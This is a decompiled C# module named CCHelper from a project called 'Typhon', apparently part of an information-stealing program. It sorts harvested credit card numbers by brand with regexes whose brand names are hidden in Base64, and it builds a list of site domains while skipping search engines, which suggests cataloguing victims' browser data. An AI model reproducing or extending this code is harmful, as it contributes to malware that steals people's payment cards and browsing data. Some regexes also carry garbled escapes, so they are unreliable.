using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;

namespace Typhon.Modules.Miscellaneous
{
	// Token: 0x02000033 RID: 51
	internal class CCHelper
	{
		// Token: 0x060000D2 RID: 210 RVA: 0x00008310 File Offset: 0x00006510
		private static bool AddValue(string value, List<string> domains)
		{
			string text = value.Replace("www.", "").ToLower();
			if (text.Contains("google") || text.Contains("bing") || text.Contains("yandex") || text.Contains("duckduckgo") || text.Contains("yahoo"))
			{
				return false;
			}
			if (text.StartsWith("."))
			{
				text = text.Substring(1);
			}
			try
			{
				text = new Uri(text).Host;
			}
			catch (UriFormatException)
			{
			}
			text = Path.GetFileNameWithoutExtension(text);
			text = text.Replace(".com", "").Replace(".org", "");
			foreach (string text2 in domains)
			{
				if (text.ToLower().Replace(" ", "").Contains(text2.ToLower().Replace(" ", "")))
				{
					return false;
				}
			}
			text = CultureInfo.CurrentCulture.TextInfo.ToTitleCase(text);
			domains.Add(text);
			return true;
		}

		// Token: 0x060000D3 RID: 211 RVA: 0x0000845C File Offset: 0x0000665C
		public static string DetectCCType(string number)
		{
			foreach (KeyValuePair<string, Regex> keyValuePair in CCHelper.CCTypes)
			{
				if (keyValuePair.Value.Match(number.Replace(" ", "")).Success)
				{
					return keyValuePair.Key;
				}
			}
			return "Unknown";
		}

		// Token: 0x04000070 RID: 112
		private static Dictionary<string, Regex> CCTypes = new Dictionary<string, Regex>
		{
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("QW1leCBDYXJk")),
				new Regex("^3[47][0-9]{13}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("QkNHbG9iYWw=")),
				new Regex("^(6541|6556)[0-9]{12}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("Q2FydGUgQmxhbmNoZSBDYXJk")),
				new Regex("^389[0-9]{11}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("RGluZXJzIENsdWIgQ2FyZA==")),
				new Regex("^3(?:0[0-5]|[68][0-9])[0-9]{11}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("RGlzY292ZXIgQ2FyZA==")),
				new Regex("6(?:011|5[0-9]{2})[0-9]{12}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("SW5zdGEgUGF5bWVudCBDYXJk")),
				new Regex("^63[7-9][0-9]{13}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("SkNCIENhcmQ=")),
				new Regex("^(?:2131|1800|35\\\\d{3})\\\\d{11}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("S29yZWFuTG9jYWxDYXJk")),
				new Regex("^9[0-9]{15}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("TGFzZXIgQ2FyZA==")),
				new Regex("^(6304|6706|6709|6771)[0-9]{12,15}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("TWFlc3RybyBDYXJk")),
				new Regex("^(5018|5020|5038|6304|6759|6761|6763)[0-9]{8,15}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("TWFzdGVyY2FyZA==")),
				new Regex("5[1-5][0-9]{14}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("U29sbyBDYXJk")),
				new Regex("^(6334|6767)[0-9]{12}|(6334|6767)[0-9]{14}|(6334|6767)[0-9]{15}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("U3dpdGNoIENhcmQ=")),
				new Regex("^(4903|4905|4911|4936|6333|6759)[0-9]{12}|(4903|4905|4911|4936|6333|6759)[0-9]{14}|(4903|4905|4911|4936|6333|6759)[0-9]{15}|564182[0-9]{10}|564182[0-9]{12}|564182[0-9]{13}|633110[0-9]{10}|633110[0-9]{12}|633110[0-9]{13}$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("VW5pb24gUGF5IENhcmQ=")),
				new Regex("^(62[0-9]{14,17})$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("VmlzYSBDYXJk")),
				new Regex("4[0-9]{12}(?:[0-9]{3})?$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("VmlzYSBNYXN0ZXIgQ2FyZA==")),
				new Regex("^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$")
			},
			{
				Encoding.UTF8.GetString(Convert.FromBase64String("RXhwcmVzcyBDYXJk")),
				new Regex("3[47][0-9]{13}$")
			}
		};
	}
}
